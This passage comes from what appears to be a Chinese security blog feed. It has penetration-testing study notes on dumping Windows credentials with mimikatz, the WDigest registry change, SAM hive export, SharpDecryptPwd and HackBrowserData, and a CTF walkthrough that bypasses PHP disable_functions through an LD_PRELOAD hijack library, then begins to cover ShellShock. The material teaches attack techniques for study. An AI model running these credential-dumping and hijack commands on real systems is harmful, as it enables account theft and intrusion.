class="language-bash">开启WDigest</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭WDigest</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure><p><strong>在线读取SAM文件</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit<br><span class="hljs-meta prompt_">#</span><span class="language-bash">privilege::debug用于提升至DebugPrivilege权限；token::elevate用于提升至SYSTEM权限；用于读取本地的SAM文件</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325001115648.png" alt="image-20240325001115648"></p><p>读取 SAM 文件中保存的用户登录凭据，可以导出当前系统中所有本<br>地用户的哈希值。</p><p><strong>离线读取SAM文件</strong></p><p>离线读取就是将SAM文件导出，再用mimikatz来读取。不过为了提高 SAM 文件的安全性以防止离线破解，Windows 会对 SAM 文件使用密钥进行加密，这个密钥存储在 SYSTEM 文件中，与 SAM 文件位于相同目录下。</p><p>因为系统在运行时，这两个文件是被锁定的，所以需要借助一些工具来实现，而PowerSploit 项目中提供的Invoke-NinjaCopy.ps1脚本可以完成这项工作</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination C:\Temp\SAM<br><br>Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination C:\Temp\SYSTEM<br></code></pre></td></tr></table></figure><blockquote><p>此外如果能够提权，测试人员可以直接读取SAM和SYSTEM</p></blockquote><p>还可以在管理员权限下通过保存注册表的方式导出</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg save HKLM\SAM sam.hive<br>reg save HKLM\SYSTEM system.hive<br></code></pre></td></tr></table></figure><p>然后将导出的两个文件使用mimikatz加载并读取sam中的用户凭据信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit<br></code></pre></td></tr></table></figure><h2 id="获取常见应用软件凭据"><a href="#获取常见应用软件凭据" class="headerlink" title="获取常见应用软件凭据"></a>获取常见应用软件凭据</h2><p>为了扩大可访问的范围，测试人员通常会搜索各种常见的密码存储位置，以获取用户凭据。一些特定的应用程序可以存储密码，以方便用户管理和维护，如Xmanager、TeamViewer、FileZilla、NaviCat和各种浏览器等。通过对保存的用户凭据进行导出和解密，测试人员通常可以获取登录内网服务器和各种管理后台的账号密码，可以通过它们进行横向移动和访问受限资源。</p><p><strong>获取RDP保存的凭据</strong></p><p>为了避免每次连接服务器都进行身份验证，经常使用RDP远程桌面连接远程服务器的用户可能勾选保存连接凭据，以便进行快速的身份验证。这些凭据都使用数据保护API以加密形式存储在 Windows 的凭据管理器中，路径为%USERPROFILE%\AppData\LocalMicrosoft\Credentials </p><blockquote><p>%USERPROFILE%即为C:\Users&lt;用户名&gt;</p></blockquote><p>下面命令可以查看当前主机上保存的所有连接凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cmdkey /list #查看当前保存的凭据<br>dir /a %USERPROFILE%\AppData\LocalMicrosoft\Credentials\* #遍历Credentials下保存的所有凭据<br></code></pre></td></tr></table></figure><p>我这里没有凭据所以就借助书中的图来记录，我们可以看到两个历史凭据</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003242224.png" alt="image-20240325003242224"></p><p>然后用mimikatz来导出指定RDP连接凭据，执行下面命令解析连接凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;dpapi::cred /in:%USERPROFILE%\AppData\LocalMicrosoft\Credentials\2B23BCADBE2FAD8EA21E6E9F0516772C&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003535797.png" alt="image-20240325003535797"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003553911.png" alt="image-20240325003553911"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003606845.png" alt="image-20240325003606845"></p><p>上图中得到的 pbData就是凭据的加密数据，guidMasterKey 是该凭据的 GUID，记录 guidMasterKey 的值。然后执行以下命令:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa:dpapi&quot; exit<br></code></pre></td></tr></table></figure><p>找到与 guidMasterKey(GUID)相关联的MasterKey，这个MasterKey就是加密凭据所使用的密钥。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003915323.png" alt="image-20240325003915323"></p><p>记录结果中的MasterKey值，最后执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;dpapi::cred /in:%USERPROFILE%\AppData\LocalMicrosoft\Credentials\2B23BCADBE2FAD8EA21E6E9F0516772C/masterkey:&lt;刚刚记录的masterkey的值&gt;&quot; exit<br></code></pre></td></tr></table></figure><p>最后成功解密得到RDP明文凭据</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325004214310.png" alt="image-20240325004214310"></p><p><strong>获取Xshell保存的凭据</strong></p><p>Xshell 会将服务器连接信息保存在Session目录下的.xsh 文件中，路径如表 如下图。如果用户在连接时勾选了“记住用户名&#x2F;密码”，该文件会保存远程服务器连接的用户名和经过加密后的密码。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325004349401.png" alt="image-20240325004349401"></p><p>Xshell 7 前的版本，测试人员可以直接通过 SharpDecryptPwd 工具进行解密，包括Navicat、TeamViewer、FileZilla、WinSCP和Xmangager 系列产品，工具地址：<a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p><p>将工具上传到主机，执行下面命令可以直接获取Xshell保存的所有连接凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -Xmangager -p &quot;%USERPROFILE%\Documents\NetSarang Computer 6\Xshell\Sessions&quot;<br></code></pre></td></tr></table></figure><p>Xshell 7后的版本，Session目录中不再存储用户密码，用上述方法获取的密码为一串乱码，只能使用星号密码查看器直接查看密码.</p><p><strong>获取FileZilla保存的凭据</strong></p><p>FileZilla 是一款快速的、可依赖的、开源的 FTP 客户端软件，具备大多数 FTP 软件功能。FileZila会将所有FTP登录凭据以Base64密文的格式保存在%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml文件中,如图所示。</p><p>由图可知<User>节点记录了 FTP 登录用户,<Pass>节点记录了 Base64 加密后的用户密码，将加密的FTP密码解码即可。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325004912460.png" alt="image-20240325004912460"></p><p>使用SharpDecryptPwd执行下面命令可以一键导出FileZilla保存的FTP登录凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -FileZilla<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325005038300.png" alt="image-20240325005038300"></p><p><strong>获取NaviCat保存的凭据</strong></p><p>用户连接数据库时，需要填写相关信息，如IP、用户名、密码等。用户选择保存密码(默认勾选)后，Navicat将把这些信息保存到注册表中，具体路径如下表</p><table><thead><tr><th>数据库类型</th><th>凭据存储路径(注册表)</th></tr></thead><tbody><tr><td>Mysql</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>MariaDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>MongoDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>SQL SERVER</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>Oracle</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>PostgreSQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>SQLite</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\&lt; Connetion Name&gt;</td></tr></tbody></table><p>数据库的连接记录中的Pwd键的值为经过Navicat&lt;&#x3D;11版本算法加密过后的密码，可以在网上搜索解密脚本解出。</p><p>也可以直接使用 Navicat 导出所有连接，将生成connections.ncx 文件，保存所有连接记录。其中，“Password”对应的值即使用 Navicat&gt;&#x3D;12 版本算法加密过后的密码，再对其进行解密。</p><p>下面命令可以一键导出当前主机上用户连接过的所有数据库的登录凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -NavicatCrypto<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325010347363.png" alt="image-20240325010347363"></p><p><strong>获取浏览器保存的登陆凭据</strong></p><p>Web 浏览器通常会保存网站用户名和密码等凭据，以避免多次手动输入。通常，用户的凭据以加密格式存储在本地文件中，测试人员可以通过读取特定的文件，从Web 浏览器中获取凭据。</p><p>HackBrowserData 是一款开源工具，可以直接从浏览器解密数据包括用户登录密码书签、Cookie、历史记录、信用卡、下载链接等，支持流行的浏览器，可在 Windows、macOS 和 Linux平台上运行，工具地址：<a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p><p>只需将 HackBrowserData 上传到目标主机，然后直接运行即可，执行完毕后，会在当前目录下生成一个 result 目录，包含当前主机中已安装的所有浏览器保存的用户登录密码、浏览器书签、Cookie、历史记录等信息的 CSV 文件。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325005731788.png" alt="image-20240325005731788"></p><p>用excel打开就可以看到解密出来的所有登陆凭据</p><p><strong>获取WinSCP保留的登陆凭据</strong></p><p>WinSCP是Windows环境下使用SSH的开源图形化SFTP 工具客户端。在使用SFTP连接时，如果勾选了“保存密码”，WinSCP就会将密码保存在WinSCP.ini文件下。Winscppwd工具则可以进行解密。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325005905488.png" alt="image-20240325005905488"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升技术-1</title>
      <link href="/2024/03/15/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF-1/"/>
      <url>/2024/03/15/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF-1/</url>
      
        <content type="html"><![CDATA[<p><strong>该系列笔记是跟着权限提升这本书来学习的</strong></p><h1 id="Windows基础知识"><a href="#Windows基础知识" class="headerlink" title="Windows基础知识"></a>Windows基础知识</h1><h2 id="用户和用户组"><a href="#用户和用户组" class="headerlink" title="用户和用户组"></a>用户和用户组</h2><h3 id="本地用户组"><a href="#本地用户组" class="headerlink" title="本地用户组"></a>本地用户组</h3>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub的disable_function</title>
      <link href="/2024/03/11/ctfhub%E7%9A%84disable-function/"/>
      <url>/2024/03/11/ctfhub%E7%9A%84disable-function/</url>
      
        <content type="html"><![CDATA[<p><strong>这是ctfhub的Bypass disable_function知识体系</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311235539559.png" alt="image-20240311235539559"></p><p>好多新东西能学的，来研究一下。</p><h1 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><p><strong>这里首先来了解一下动态链接库(也叫共享库)，这部分在深入理解计算机系统这本书有详细说明，这里简单了解一下</strong></p><p><strong>共享库</strong>（shared library）是致力于解决静态库缺陷的一个现代创新产物。共享库是一个目标模块，在运行或加载时，可以加载到任意的内存地址，并和一个在内存中的程序链接起来。这个过程称为<strong>动态链接</strong>（dynamic linking），是由一个叫做<strong>动态链接器</strong>（dynamic linker）的程序来执行的。共享库也称为<strong>共享目标</strong>（shared object），在 Linux 系统中通常用 .so 后缀来表示。微软的操作系统大量地使用了共享库，它们称为 DLL（动态链接库）。</p><p>程序编译的四个过程如图(预处理、编译、汇编、链接)：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312001644436.png" alt="image-20240312001644436"></p><p>一个示例程序的动态链接的过程如图：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vector.h&quot;</span></span><br><br><span class="hljs-type">int</span> x[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">int</span> y[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br><span class="hljs-type">int</span> z[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    addvec(x, y, z, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;z = [%d %d]\n&quot;</span>, z[<span class="hljs-number">0</span>], z[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312001800286.png" alt="image-20240312001800286"></p><p>这里介绍一个<strong>ldd命令</strong>，该命令的作用是：打印程序或者库文件所依赖的共享库列表</p><p>这是一个示例程序：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;string&gt; msg &#123;<span class="hljs-string">&quot;Hello&quot;</span>, <span class="hljs-string">&quot;C++&quot;</span>, <span class="hljs-string">&quot;World&quot;</span>, <span class="hljs-string">&quot;from&quot;</span>, <span class="hljs-string">&quot;VS Code&quot;</span>, <span class="hljs-string">&quot;and the C++ extension!&quot;</span>&#125;;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> string&amp; word : msg)<br>    &#123;<br>        cout &lt;&lt; word &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们用ldd去看下编译生成的程序所依赖的库</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312002417051.png" alt="image-20240312002417051"></p><p><strong>知道上面的基础东西之后，就来看一下LD_PRELOAD</strong></p><blockquote><p> LD_PRELOAD是Linux中的一个环境变量，它允许你定义在程序运行前优先加载的动态链接库，那么我们便可以在自己定义的动态链接库中装入恶意函数。</p><p>那我们就可以利用ld_preload去劫持函数来达到我们执行恶意代码的目的，比如一个文件中有一个恶意构造的函数和我们程序指令执行时调用的函数一模一样，而LD_PRELOAD路径指向这个文件后，这个文件的优先级高于原本函数的文件，那么优先调用我们的恶意文件后会覆盖原本的那个函数，最后当我们执行了一个指令后它会自动调用一次恶意的函数，也是用自己写的恶意的so文件去覆盖。</p></blockquote><p><strong>这里用一个随机数函数的劫持来演示一下</strong></p><p>生成随机数的代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>srand(time(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//随机生成种子，保证每次出现的随机数不相同</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span>(i--) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,rand());<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -o rand randnum.c<br><br>./rand<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312003634363.png" alt="image-20240312003634363"></p><p>接下来写一个用于劫持的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//unrand.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">rand</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">666</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后用下面的命令生成so文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">gcc -shared -fPIC 自定义文件.c -o 生成的库文件.so</span><br>gcc -shared -fPIC unrand.c -o unrand.so<br>export LD_PRELOAD=$PWD/unrand.so<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-fpic 选项指示编译器生成与位置无关的代码,-shared 选项指示链接器创建一个共享的目标文件</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">unset</span> LD_PRELOAD 可以还原函数关系</span><br></code></pre></td></tr></table></figure><p>然后用ldd命令去看一下前后动态库加载的顺序</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312004616502.png" alt="image-20240312004616502"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312004626732.png" alt="image-20240312004626732"></p><p>可以看出来其中的rand的函数被我们成功劫持了。</p><p>如果不知道调用了什么函数我们还可以用下面两个命令去跟一下系统调用的情况,但是这两个跟踪的重点有所不同</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">strace a.out  #跟踪系统调用和信号<br>ltrace a.out  #用来跟踪进程调用库函数的情况<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319163751066.png" alt="image-20240319163751066"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319163811697.png" alt="image-20240319163811697"></p><p>所以想要劫持具体函数的时候可以用ltrace这个命令更清晰</p><p>还有一个<strong>readelf</strong>命令可以用来查看elf文件的信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">readelf -s &lt;ELF文件&gt; #可以显示包含在可执行文件或共享库中的所有符号，包括函数符号<br></code></pre></td></tr></table></figure><blockquote><p>更多的东西参考这两篇文章：<a href="https://blog.csdn.net/qq_63701832/article/details/129760495">LD_PRELOAD劫持（超详细篇）-CSDN博客</a>，<a href="https://cs.pynote.net/se/202203301/#_1">用LD_PRELOAD劫持的原理和实践 | CS笔记 (pynote.net)</a></p></blockquote><p><strong>现在看回这道题</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312220351561.png" alt="image-20240312220351561"></p><p>这个页面直接就是一个shell，那我们直接蚁剑去连接，用虚拟终端执行了一下命令，发现执行不了的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312220455165.png" alt="image-20240312220455165"></p><p>这里就是因为disable_function禁用了所有命令执行的函数，所以这里就要用到ld_preload劫持的方法了，我们去看目录是有一个&#x2F;flag的，但是没有东西应该也是因为函数禁用的原因，然后还有一个&#x2F;readflag程序，应该就是要调用那个程序来读flag</p><p>这里先在本地Linux上写一个hack.c程序：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">angel</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;/readflag &gt; /tmp/eval.txt&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后生成hack.so文件,上传到&#x2F;tmp目录下</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -shared -fPIC hack.c -o hack.so<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312221737068.png" alt="image-20240312221737068"></p><p>然后我们再写一个php文件用于修改环境变量并用于调用被劫持的函数来读flag</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;ld_preload=/tmp/hack.so&quot;</span>);<br><br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312221702596.png" alt="image-20240312221702596"></p><p>然后去include一下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312222556100.png" alt="image-20240312222556100"></p><p>就可以看到&#x2F;tmp目录一下有flag了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312222624367.png" alt="image-20240312222624367"></p><p>现在来解释一下上面的原理：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__attribute__((constructor)) 是一种 GNU C 语言扩展，用于设置函数属性。<br><br>__attribute__ 是一个特性（attribute）机制，它允许你为函数、变量或类型添加额外的属性。这些属性可以影响编译器的行为，从而优化程序的性能、可移植性和可读性。<br><br>__attribute__((constructor)) 用于指定一个函数，该函数会在程序启动时自动执行，并且在 main() 函数之前。<br><br>类似地，还有 __attribute__((destructor))，它会在 main() 函数退出或调用 exit() 后自动执行。这对于释放资源或清理工作非常有用。<br><br>你还可以为属性设置优先级，例如：__attribute__((constructor(101))) void before1();这将按照优先级顺序调用带有 constructor 属性的函数。<br><br>注意，__attribute__ 是 GCC 编译器的扩展语法，不是标准 C 语言的一部分，因此在使用时需要考虑可移植性问题。<br></code></pre></td></tr></table></figure><blockquote><p>这里用mail()和error_log()的原因是因为他们都会去调用外部的&#x2F;usr&#x2F;sbin&#x2F;sendmail程序用来发送邮件信息，所以我们就可以因此而劫持，可以用下面的命令去查看一下跟踪一下该函数的调用</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">strace -f -e trace=execve php 1.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319170122690.png" alt="image-20240319170122690"></p><p>然后我们还可以用命令去查看该程序调用了什么函数</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">readelf -Ws /usr/sbin/sendmail<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312225539592.png" alt="image-20240312225539592"></p><p>我们也可以去针对里面的一些函数去劫持，效果是一样的。</p></blockquote><h1 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h1><p>shellshock是一个在2014被公布的和bash有关的漏洞</p><p>参考文章：<a href="https://www.zhihu.com/tardis/zm/art/35579956?source_id=1003">什么是ShellShock攻击？ (zhihu.com)</a></p><p><strong>就先来了解一下bash</strong></p><blockquote><p>bash是一个shell环境，它允许用户输入命令来与操作系统进行交互，执行各种任务。</p></blockquote><p>我们每次输入bash的时候，系统就会创建一个新的子进程，而且涉及到fork和exec这两个系统调用的配合，其中的过程有下面几个步骤：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.fork调用：当Bash需要创建一个新的子进程时，它首先调用fork。这个调用会创建一个与当前进程（父进程）几乎完全相同的新进程（子进程）。子进程会复制父进程的内存空间，包括代码段、数据段和堆栈段。fork调用在父进程中返回新创建的子进程的进程ID，在子进程中返回0。<br><br><br>2.子进程的环境：尽管子进程复制了父进程的内存空间，但它是一个独立的进程，拥有自己的进程ID，并且其执行路径可以与父进程不同。<br><br><br>3.exec调用：在子进程中，通常会随后调用exec系列函数之一来执行一个新的程序。exec函数会替换当前进程的内存空间，包括代码段和数据段，用新程序的内容来替换。这意味着子进程将停止执行原先继承自父进程的程序，开始执行exec指定的新程序。从用户的角度看，子进程似乎变成了一个全新的程序。<br><br><br>4.父进程的行为：在fork之后，父进程可以选择等待子进程结束，或者继续执行其他任务。如果父进程选择等待，它可以使用wait或waitpid系统调用来获取子进程的终止状态。<br></code></pre></td></tr></table></figure><p>这个机制可以让bash在不终止当前会话的情况下，启动和管理多个任务，例如在运行一个外部脚本的时候，bash就会使用fork和exec来创建一个运行该命令的子进程，而bash自身则继续等待下一个用户的输入。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">echo &quot;父进程的PID：$$&quot;<br>bash -c &#x27;echo &quot;子进程的PID：$$&quot;&#x27;<br></code></pre></td></tr></table></figure><p>上面两个命令输出结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318234637280.png" alt="image-20240318234637280"></p><p>我们还可以通过下面几个命令查看进程情况</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ps -f #查看当前进程的状态，-f表示全格式，可以显示出父进程的ID(PPID)<br>pstree -p #以树状图的形式显示进程及其子进程，-p选项可以显示进程的PID<br>cat /proc/PID/status #输入想要看的进程PID，可以知道进程的各种详细情况<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318235046836.png" alt="image-20240318235046836"></p><p>下面是会启动子进程的几种方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.后台作业：使用&amp;将命令放入后台执行，例如command &amp;。<br>2.管道：使用|将多个命令连接起来，每个命令都会在子进程中执行，例如command1 | command2。<br>3.括号命令列表：使用()将命令包围起来，这些命令会在子shell中执行，例如(cmd1; cmd2; cmd3)。<br>4.执行外部脚本或程序：直接运行一个脚本或程序，如bash ./test.sh。<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">(echo $BASH_SUBSHELL)  #BASH_SUBSHELL这个变量能显示当前shell的嵌套深度<br><span class="hljs-meta prompt_">$</span><span class="language-bash">BASH_SUBSHELL</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319000940380.png" alt="image-20240319000940380"></p><p><strong>环境变量和bash</strong></p><p>在bash中，子进程是不能继承父进程的普通变量或函数变量的，但是可以继承父进程的普通环境变量和函数环境变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# gu=&quot;hacker&quot;<br><br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $gu<br>hacker<br><br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $gu<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321084451562.png" alt="image-20240321084451562"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export gu<br><br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# 